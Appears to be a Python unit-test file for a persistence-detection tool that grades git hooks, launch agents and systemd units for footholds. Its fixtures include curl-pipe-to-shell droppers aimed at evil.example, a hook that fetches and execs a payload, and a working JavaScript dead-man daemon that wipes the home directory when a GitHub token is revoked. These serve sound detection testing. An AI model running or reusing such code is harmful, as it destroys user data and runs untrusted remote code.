        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        (self.hooks / "lib.py").unlink()
        (self.hooks / "lib.awk").write_text('BEGIN { system("/tmp/.x/stage") }\n', encoding="utf-8")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        (self.hooks / "lib.awk").unlink()
        (self.hooks / "lib.py").write_text('import os\nos.system("git status")\n', encoding="utf-8")
        (self.hooks / "lib.py").write_text('import os\nos.system("git status")\nLOG = os.environ.get("L") or "/tmp/l"\n',
                                           encoding="utf-8")
        self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})
        self.assertEqual(self._run(), [])

    def test_a_command_continued_on_the_next_line_is_one_command(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        (self.hooks / "lib.sh").write_text("nohup \\\n/tmp/.x/stage &\n", encoding="utf-8")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_the_executable_bit_makes_code_only_of_a_file_with_no_suffix_and_only_where_it_means_something(self):
        hint = "Install by hand: curl -sSfL https://example.invalid/install.sh | sh\n"
        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\n")
        self._hook("README.md", hint)
        self._hook("hooks.json", '{"pre-commit": "lint"}\n')
        self.assertEqual(self._run(), [])
        self._hook("helper", hint)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        with mock.patch("stayawake.bots.security.hookscript.honours_exec_bit", return_value=False):
            self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})
            self.assertEqual(self._run(), [])

    def test_notes_are_digested_however_large(self):
        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\n")
        lock = self.hooks / "package-lock.json"
        lock.write_text('{"packages":{' + ",".join(f'"p{i}":"1.0.{i}"' for i in range(200_000)) + "}}\n",
                        encoding="utf-8")
        self.assertGreater(lock.stat().st_size, hookscript.MAX_SUPPORT_FILE)
        entries, unread = surface.enumerate_entries()
        self.assertEqual(unread, [])
        before = entries[0].digest()
        self.assertEqual(self._run(), [])
        self.assertEqual(self._run(), [])
        with lock.open("a", encoding="utf-8") as fh:
            fh.write("\n")
        (e,) = surface.enumerate_entries()[0]
        self.assertNotEqual(e.digest(), before)
        with mock.patch.object(hookscript, "MAX_DIGEST_FILE", 4096):
            self.assertEqual(surface.enumerate_entries()[1], [lock])

    def test_the_digest_budget_of_a_directory_is_bounded(self):
        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\n")
        for i in range(4):
            (self.hooks / f"blob{i}.bin").write_bytes(b"\x00" + bytes(range(256)) * 16)
        self.assertEqual(surface.enumerate_entries()[1], [])
        with mock.patch.object(hookscript, "MAX_DIGEST_TOTAL", 3 * 4097):
            self.assertEqual(surface.enumerate_entries()[1], [self.hooks / "blob3.bin"])

    def test_anything_foreign_in_the_directory_saw_manages_is_a_foothold(self):
        with mock.patch("stayawake.bots.security.hookscript.hooks_dir", return_value=self.hooks):
            for name, text in {
                "python": "#!/usr/bin/env python3\nimport subprocess, os\n"
                          "subprocess.run(['curl', '-s', 'http://127.0.0.1:9/p', '-o', '/tmp/p'])\n"
                          "os.execv('/bin/sh', ['/bin/sh', '/tmp/p'])\n",
                "ordinary": "#!/bin/sh\nnpx lint-staged\n",
                "quiet": "#!/bin/sh\nnohup \"$HOME/.cfg/agent\" &\n",
            }.items():
                (self.hooks / "post-checkout").unlink(missing_ok=True)
                self._hook("post-checkout", text)
                issues = self._run()
                self.assertIn("autorun-unattributed-foothold", self.ids(issues), name)
                self.assertTrue(any("directory saw manages" in i.detail for i in issues), name)
            (self.hooks / "post-checkout").unlink()
            for event in hookscript.HOOKS:
                self._hook(event, hookscript.render(event, "/home/op/.local/bin/saw", None))
            self.assertEqual(self._run(signed=None), [])

    def test_a_chained_local_hook_is_read_too(self):
        self._hook("post-merge", hookscript.render("post-merge", "/usr/local/bin/saw", None))
        self._hook("post-merge.local", "#!/bin/sh\n/tmp/.x/run\n")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_an_ordinary_foreign_hook_is_reported_only_when_it_appears_or_changes(self):
        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\n")
        self.assertEqual(self._run(), [])
        self.assertEqual(self._run(), [])
        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\nnode ./scripts/check.js\n")
        issues = self._run()
        self.assertEqual(self.ids(issues), {"autorun-new-unattributed"})
        self.assertIn("changed", issues[0].detail)

    @unittest.skipIf(os.getuid() == 0, "root bypasses permission bits")
    def test_an_unreadable_hooks_dir_is_not_clean(self):
        os.chmod(self.hooks, 0o000)
        try:
            issues = check_autorun()
        finally:
            os.chmod(self.hooks, 0o700)
        self.assertIn("persistence-surface-unverified", self.ids(issues))


class TestHookScript(unittest.TestCase):
    def test_what_saw_installs_is_recognised_and_one_byte_off_is_not(self):
        for event in hookscript.HOOKS:
            for saw, cfg in (("/usr/local/bin/saw", None), ("/opt/my saw$dir/saw", "/home/op/c f.yml"),
                             ("/Users/o'neil/.local/bin/saw", None)):
                text = hookscript.render(event, saw, cfg)
                self.assertTrue(hookscript.is_pristine(text), (event, saw, cfg))
                self.assertFalse(hookscript.is_pristine(text + "\n"), (event, saw, cfg))
                self.assertFalse(hookscript.is_pristine(text.replace("|| true", "|| sh")), (event, saw))
        crossed = hookscript.render("post-merge", "/usr/local/bin/saw", None).replace(
            'post-merge "$@"', 'post-checkout "$@"')
        self.assertFalse(hookscript.is_pristine(crossed))

    def test_the_hook_dirs_are_the_templates_and_the_seeded_repositories(self):
        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        repo = home / "proj"
        repo.mkdir()
        import subprocess
        subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
        cache = home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True)
        cache.write_text(json.dumps({str(repo): "abc", "relative/path": "def",
                                     str(home / "deleted-long-ago"): "0ld"}))
        asked = []
        real = hookscript.gitutil.stdout

        def counting(cwd, argv):
            asked.append(cwd)
            return real(cwd, argv)

        with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config"),
                                          "XDG_CACHE_HOME": str(home / ".cache")}), \
             mock.patch("stayawake.bots.security.hookscript.global_template_dir",
                        return_value=str(home / "operator-template")), \
             mock.patch.object(hookscript.gitutil, "stdout", side_effect=counting):
            dirs = hookscript.hook_dirs()
        self.assertEqual(dirs, [home / ".config" / "saw" / "git-template" / "hooks",
                                home / "operator-template" / "hooks",
                                repo / ".git" / "hooks"])
        self.assertEqual(asked, [repo])

    def test_a_repository_that_redirects_its_hooks_is_read_where_git_reads_it(self):
        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        repo = home / "proj"
        repo.mkdir()
        import subprocess
        subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
        subprocess.run(["git", "-C", str(repo), "config", "core.hooksPath", ".husky/_"], check=True)
        self.assertEqual(hookscript.repository_hooks_dir(repo), repo / ".husky/_")
        subprocess.run(["git", "-C", str(repo), "config", "core.hooksPath", "/tmp/.x/hooks"], check=True)
        self.assertEqual(hookscript.repository_hooks_dir(repo), Path("/tmp/.x/hooks"))
        subprocess.run(["git", "-C", str(repo), "config", "--unset", "core.hooksPath"], check=True)
        self.assertEqual(hookscript.repository_hooks_dir(repo), repo / ".git" / "hooks")
        self.assertIsNone(hookscript.repository_hooks_dir(home / "not-a-repo"))

    def test_the_executable_bit_is_trusted_only_where_git_keeps_one(self):
        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        repo = home / "proj"
        (repo / ".githooks").mkdir(parents=True)
        import subprocess
        subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
        subprocess.run(["git", "-C", str(repo), "config", "core.fileMode", "true"], check=True)
        self.assertTrue(hookscript.honours_exec_bit(repo / ".githooks"))
        self.assertTrue(hookscript.honours_exec_bit(repo / ".git" / "hooks"))
        subprocess.run(["git", "-C", str(repo), "config", "core.fileMode", "false"], check=True)
        self.assertFalse(hookscript.honours_exec_bit(repo / ".githooks"))
        self.assertFalse(hookscript.honours_exec_bit(repo / ".git" / "hooks"))
        self.assertTrue(hookscript.honours_exec_bit(home / "not-a-repo"))

    def test_a_linked_worktree_and_a_submodule_are_read_where_git_runs_their_hooks(self):
        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        import subprocess
        main = home / "proj"
        main.mkdir()
        for cmd in (["init", "-q"], ["config", "user.email", "t@t"], ["config", "user.name", "t"],
                    ["config", "commit.gpgsign", "false"], ["commit", "-q", "--allow-empty", "-m", "i"],
                    ["worktree", "add", "-q", str(home / "proj-feature"), "-b", "feature"]):
            subprocess.run(["git", "-C", str(main), *cmd], check=True, capture_output=True)
        linked = hookscript.repository_hooks_dir(home / "proj-feature")
        self.assertTrue(linked.is_dir(), linked)
        self.assertEqual(linked.resolve(), (main / ".git" / "hooks").resolve())

    def test_a_seeded_repository_git_cannot_answer_for_withholds_the_all_clear(self):
        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        repo = home / "proj"
        repo.mkdir()
        gitdir = home / "gitdir"
        gitdir.mkdir()
        (repo / ".git").write_text(f"gitdir: {gitdir}\n", encoding="utf-8")
        os.chmod(gitdir, 0)
        self.addCleanup(os.chmod, gitdir, 0o700)
        cache = home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True)
        cache.write_text(json.dumps({str(repo): "abc"}))
        unread: list = []
        with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config"),
                                          "XDG_CACHE_HOME": str(home / ".cache")}), \
             mock.patch("stayawake.bots.security.hookscript.global_template_dir", return_value=None):
            dirs = hookscript.hook_dirs(unread)
        self.assertEqual(dirs, [home / ".config" / "saw" / "git-template" / "hooks"])
        self.assertEqual(unread, [repo])

    def test_a_hooks_directory_shared_by_seeded_repositories_is_enumerated_once(self):
        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        shared = home / ".githooks"
        shared.mkdir()
        import subprocess
        repos = []
        for name in ("a", "b"):
            repo = home / name
            repo.mkdir()
            subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
            subprocess.run(["git", "-C", str(repo), "config", "core.hooksPath", str(shared)], check=True)
            repos.append(repo)
        cache = home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True)
        cache.write_text(json.dumps({str(r): "abc" for r in repos}))
        with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config"),
                                          "XDG_CACHE_HOME": str(home / ".cache")}), \
             mock.patch("stayawake.bots.security.hookscript.global_template_dir", return_value=None):
            dirs = hookscript.hook_dirs()
        self.assertEqual(dirs, [home / ".config" / "saw" / "git-template" / "hooks", shared])

    def test_the_directory_saw_manages_is_no_longer_only_its_own_once_adopted_as_the_hooks_path(self):
        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config")}):
            own = hookscript.hooks_dir() / "pre-commit"
            with mock.patch("stayawake.bots.security.hookscript.global_hooks_path", return_value=None):
                self.assertTrue(hookscript.in_managed_dir(own))
            with mock.patch("stayawake.bots.security.hookscript.global_hooks_path",
                            return_value=str(hookscript.hooks_dir())):
                self.assertFalse(hookscript.in_managed_dir(own))


class TestProvenance(unittest.TestCase):
    def test_path_classification(self):
        self.assertEqual(provenance._classify_path("/usr/bin/x"), "trusted")
        self.assertEqual(provenance._classify_path("/Applications/Z.app/Contents/MacOS/z"), "trusted")
        self.assertEqual(provenance._classify_path("/tmp/x"), "untrusted")
        self.assertEqual(provenance._classify_path("~/.cache/x"), "untrusted")
        self.assertEqual(provenance._classify_path("/home/u/bin/x"), "unknown")

    def test_fail_closed_to_unattributed_on_subprocess_error(self):
        e = surface.AutorunEntry(location="l", path=Path("/x"), argv=["/home/u/bin/tool"])
        with mock.patch(f"{_ATTR}._run", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            a = provenance.attribute(e)
        self.assertFalse(a.attributed)                    # unknown owner + unknown sign → NOT blessed

    def test_owner_or_trusted_signed_is_attributed(self):
        self.assertTrue(provenance.Attribution("trusted", owner="coreutils").attributed)
        self.assertTrue(provenance.Attribution("trusted", signed=True).attributed)
        self.assertFalse(provenance.Attribution("trusted", signed=False).attributed)  # unsigned → not
        self.assertFalse(provenance.Attribution("untrusted").attributed)


class TestFusionGrading(_Surface):
    def _run(self, **patches):
        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
            return check_autorun()

    def test_attributed_benign_is_clean(self):
        self.write("ok.plist", ProgramArguments=["/usr/bin/true"], RunAtLoad=True)
        self.assertEqual(self._run(signed=True), [])       # trusted + signed + no bad shape → clean

    def test_fetch_exec_is_a_foothold_even_if_signed(self):
        self.write("bad.plist", ProgramArguments=["/usr/bin/curl", "http://x", "|", "sh"], RunAtLoad=True)
        issues = self._run(signed=True)
        self.assertIn(models.HygieneIssue, {type(i) for i in issues})
        self.assertIn("autorun-unattributed-foothold", self.ids(issues))

    def test_a_damaged_launch_agent_is_graded_like_an_intact_one(self):
        raw = _agent(ProgramArguments=["/tmp/agent"], RunAtLoad=True).decode()
        (self.d / "t.plist").write_bytes(raw.rsplit("</plist>", 1)[0].encode())
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_untrusted_path_with_persistence_is_a_foothold(self):
        self.write("t.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_referenced_script_payload_is_caught(self):
        # the payload lives in the referenced SCRIPT, not the unit file — the monitor reads it (for an
        # unattributed entry) and catches the dropper without a signature for it.
        script = self.d / "run.sh"
        script.write_text("#!/bin/sh\ncurl http://evil.example/x | sh\n")
        self.write("s.plist", ProgramArguments=[str(script)], RunAtLoad=False)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_foothold_drives_rotation_unsafe_and_exit3(self):
        # a strong autorun finding is an ACTIVE_PERSISTENCE id → rotation UNSAFE (→ audit exit 3, #1332)
        self.assertIn("autorun-unattributed-foothold", models.ACTIVE_PERSISTENCE_IDS)
        self.write("t.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        ids = self.ids(self._run(signed=None))
        self.assertTrue(ids & models.ROTATION_UNSAFE_IDS)


# The Mini Shai-Hulud dead-man daemon: polls a LEGITIMATE endpoint (api.github.com every 60s) and wipes
# $HOME when the token is revoked. Plain code — NOT a decode→exec dropper — so it is caught by FUSING the
# destructive detector (#1334) into the autorun grading, and NEVER by a destination blocklist.
_DEADMAN = ("const os=require('os'),fs=require('fs');\n"
            "setInterval(async()=>{\n"
            "  const r=await fetch('https://api.github.com/user',{headers:{authorization:tok}});\n"
            "  if(r.status===401) fs.rmSync(os.homedir(),{recursive:true,force:true});\n"
            "},60000);\n")
# A benign timer daemon: same legitimate endpoint, same 60s cadence, same non-interactive origin — but
# no destructive behaviour. The behavioural features it SHARES with the wiper must not flag it.
_BENIGN_TIMER = ("const https=require('https');\n"
                 "setInterval(()=>{ https.get('https://api.github.com/repos/x/y/releases/latest'); },60000);\n")


class TestDeadmanDaemon(_Surface):
    """#1335 — a malicious daemon polling a legitimate endpoint can't be caught by WHERE it connects.
    The discriminating features are behavioural and, for a script-based daemon, STATIC: the poll cadence
    is a literal in the artifact, and a persistence entry is non-interactive by construction. Detection
    fuses the dead-man self-destruct (#1334) with the autorun context — no destination blocklist."""

    def _run(self, **patches):
        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
            return check_autorun()

    def test_deadman_direct_script_is_a_foothold(self):
        (self.d / "gh-token-monitor.js").write_text(_DEADMAN)
        self.write("m.plist", ProgramArguments=[str(self.d / "gh-token-monitor.js")],
                   RunAtLoad=True, StartInterval=60)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_deadman_laundered_through_trusted_interpreter_is_a_foothold(self):
        # `node /path/daemon.js`: argv[0] is the TRUSTED interpreter (signed → attributed), but node's
        # trust does not vouch for the script it runs — the daemon's code is still read and flagged.
        (self.d / "daemon.js").write_text(_DEADMAN)
        self.write("m.plist", ProgramArguments=["/usr/bin/node", str(self.d / "daemon.js")],
                   RunAtLoad=True, StartInterval=60)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=True)))  # node attributed

    def test_deadman_reason_names_the_behaviour_not_the_endpoint(self):
        (self.d / "d.js").write_text(_DEADMAN)
        self.write("m.plist", ProgramArguments=[str(self.d / "d.js")], RunAtLoad=True, StartInterval=60)
        (entry,) = surface.enumerate_entries()[0]
        sig = grade.content_signal(entry, read_referenced=True)
        self.assertTrue(sig.hit)
        self.assertTrue(any("self-destruct" in r for r in sig.reasons))      # the dead-man shape
        self.assertTrue(any("short poll interval (60s)" in r for r in sig.reasons))  # static cadence
        self.assertFalse(any("github" in r.lower() for r in sig.reasons))    # NOT keyed on the endpoint

    def test_benign_timer_daemon_is_not_decisive(self):
        # FP guard: a benign daemon sharing every behavioural feature the wiper has EXCEPT the
        # destructive payload — polls the same endpoint on the same cadence, non-interactive — must NOT
        # produce a decisive content hit. (Periodicity + non-interactive alone are never malicious.)
        (self.d / "updater.js").write_text(_BENIGN_TIMER)
        self.write("u.plist", ProgramArguments=["/usr/bin/node", str(self.d / "updater.js")],
                   StartInterval=60)
        (entry,) = surface.enumerate_entries()[0]
        sig = grade.content_signal(entry, read_referenced=True)
        self.assertFalse(sig.hit)                                            # not decisive
        self.assertFalse(any("self-destruct" in r for r in sig.reasons))    # no dead-man reason
        # a signed, attributed interpreter running this benign polling script is CLEAN end-to-end
        self.assertEqual(self._run(signed=True), [])

    def test_the_same_benign_script_IS_decisive_from_a_scratch_dir(self):
        # The paired positive, so the two properties cannot drift into each other. Behaviour alone
        # (poll + non-interactive) is never decisive; LOCATION is, on its own — no legitimate daemon
        # installs itself into a world-writable scratch dir. Same script as the test above, so the
        # only variable is where it lives.
        scratch = Path("/tmp/autorun-scratch-fixture")
        scratch.mkdir(parents=True, exist_ok=True)
        self.addCleanup(lambda: __import__("shutil").rmtree(scratch, ignore_errors=True))
        (scratch / "updater.js").write_text(_BENIGN_TIMER)
        self.write("u.plist", ProgramArguments=["/usr/bin/node", str(scratch / "updater.js")],
                   StartInterval=60)
        (entry,) = surface.enumerate_entries()[0]
        sig = grade.content_signal(entry, read_referenced=True)
        self.assertTrue(sig.hit)
        self.assertIn("scratch", " ".join(sig.reasons))

    def test_inline_eval_payload_is_scanned_not_chased_as_a_path(self):
        # `node -e '<code>'`: the payload is inline in argv (seen via shape_text), not a file. The
        # dead-man shape is still caught, and _payload_path does NOT mistake the code for a phantom path.
        inline = "const os=require('os'),fs=require('fs');fs.rmSync(os.homedir(),{recursive:true});"
        entry = surface.AutorunEntry(location="launch-agent", path=Path("/x.plist"),
                                     argv=["/usr/bin/node", "-e", inline], body="")
        self.assertIsNone(grade._payload_path(entry))   # no path at all: inline code runs no file
        self.assertFalse(grade.launched_via_interpreter(entry))
        self.assertTrue(grade.content_signal(entry).hit)               # still caught via shape_text

    def test_short_poll_interval_read_from_systemd_timer(self):
        (self.d / "d.js").write_text(_DEADMAN)
        (self.d / "w.service").write_text(
            f"[Service]\nExecStart=/usr/bin/node {self.d / 'd.js'}\n"
            "[Timer]\nOnUnitActiveSec=60\n[Install]\nWantedBy=default.target\n")
        # find the .service entry and confirm the systemd cadence is parsed as a short poll interval
        entries, _unread = surface.enumerate_entries()
        svc = next(e for e in entries if e.path.name == "w.service")
        sig = grade.content_signal(svc, read_referenced=True)
        self.assertTrue(any("short poll interval (60s)" in r for r in sig.reasons))


class TestNoveltyReview(_Surface):
    def _run(self):
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            return check_autorun()

    def test_new_unattributed_nonstrong_is_review_only_after_baseline(self):
        # an unattributed entry on an 'unknown' path with no bad shape: first run captures baseline and
        # stays quiet on the review tier; a NEW one on a later run is an info review item.
        self.write("a.plist", ProgramArguments=["/home/u/bin/mytool"], RunAtLoad=False)
        first = self._run()
        self.assertNotIn("autorun-new-unattributed", self.ids(first))   # first run: no novelty nag
        self.write("b.plist", ProgramArguments=["/home/u/bin/other"], RunAtLoad=False)
        second = self._run()
        review = [i for i in second if i.id == "autorun-new-unattributed"]
        self.assertEqual(len(review), 1)                               # the NEW entry only
        self.assertEqual(review[0].severity, "info")


class TestBaselineNotLoadBearing(_Surface):
    def _run(self):
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            return check_autorun()

    def test_foothold_caught_even_when_baseline_marks_it_known(self):
        # THE load-bearing property: launder the foothold into the baseline as 'known'; it must STILL
        # be caught (provenance + shape run regardless of the baseline).
        self.write("evil.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self._run()                                        # capture a baseline that now knows evil.plist
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_tampered_baseline_is_detected_and_ignored(self):
        self.write("evil.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self._run()
        p = baseline.baseline_path()                       # hand-edit entries without fixing self_hash
        import json
        data = json.loads(p.read_text()); data["entries"]["/laundered"] = "x"; p.write_text(json.dumps(data))
        b = baseline.load_baseline()
        self.assertEqual(b.status, "tampered")
        self.assertFalse(b.trusted)                        # → novelty ignored, foothold still graded
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))


class TestCorrelation(_Surface):
    def test_shared_unattributed_payload_across_entries(self):
        # two agents wired to the SAME unattributed payload — the campaign shape.
        self.write("a.plist", ProgramArguments=["/home/u/.local/x"], RunAtLoad=False)
        self.write("b.plist", ProgramArguments=["/home/u/.local/x"], RunAtLoad=False)
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            issues = check_autorun()
        self.assertIn("autorun-unattributed-foothold", self.ids(issues))   # correlated → strong


class TestDeterminism(_Surface):
    def test_grading_identical_at_any_worker_count(self):
        for i in range(6):
            self.write(f"a{i}.plist", ProgramArguments=[f"/tmp/x{i}"], RunAtLoad=True)
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            one = [(i.id, i.title) for i in check_autorun(jobs=1)]
            many = [(i.id, i.title) for i in check_autorun(jobs=8)]
        self.assertEqual(one, many)                        # submission-order → byte-identical findings


if __name__ == "__main__":
    unittest.main()
